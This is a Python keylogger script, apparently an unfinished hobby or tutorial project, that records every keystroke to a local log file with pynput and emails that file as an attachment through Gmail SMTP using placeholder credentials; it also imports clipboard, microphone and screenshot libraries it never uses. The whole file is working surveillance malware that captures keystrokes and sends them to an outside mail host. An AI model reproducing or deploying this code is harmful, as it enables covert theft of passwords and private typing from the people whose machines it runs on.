# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass 
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

key_information = "key_log.txt"
email_address = "xyz@gmail.com"
password = "12345"

toaddr = "xyz@gmail.com"

file_path = r"C:\Visual Studio\keylogger\project"
extend = os.path.sep

def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "Keylogger Report"

    body = "Body of the email."

    msg.attach(MIMEText(body, "plain"))

    filename = filename
    attachment = open(attachment, "rb")

    p = MIMEBase("application", "octet-stream")
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header("Content-Disposition", f"attachment; filename= {filename}")
    msg.attach(p)
    s = smtplib.SMTP("smtp.gmail.com", 587)

    s.starttls()

    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

send_email(key_information, file_path + extend + key_information, toaddr)



count = 0
keys = []

def on_press(key):
    global keys, count
    print(key)
    keys.append(key) 
    count = count + 1 

    if count >= 1:
        count = 0
        write_file(keys)
        keys.clear()  # Clear the keys list after writing

def write_file(keys):
    with open(file_path + extend + key_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()